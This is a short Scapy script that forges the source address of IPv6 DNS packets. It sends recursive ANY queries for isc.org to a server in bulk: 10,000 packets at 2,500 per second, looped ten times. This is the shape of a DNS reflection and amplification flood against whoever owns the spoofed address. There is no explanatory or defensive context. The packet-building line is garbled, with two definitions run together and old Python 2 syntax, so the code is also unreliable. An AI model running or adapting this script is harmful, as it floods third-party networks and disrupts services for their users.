from scapy.all import *
fakesrc = 'x:x:x::x'
server = 'x:x:x::x'
device = 'xxx'

mypacket = IPv6(dst=server, src=fakesrc)/UDP(dport=53, sport=8000)/DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY"))UDP(sport=RandShort())/DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
l2packet = Ether()/mypacket
sendpfast( l2packet*10000, pps=2500, loop=10, iface=device, file_cache=True )
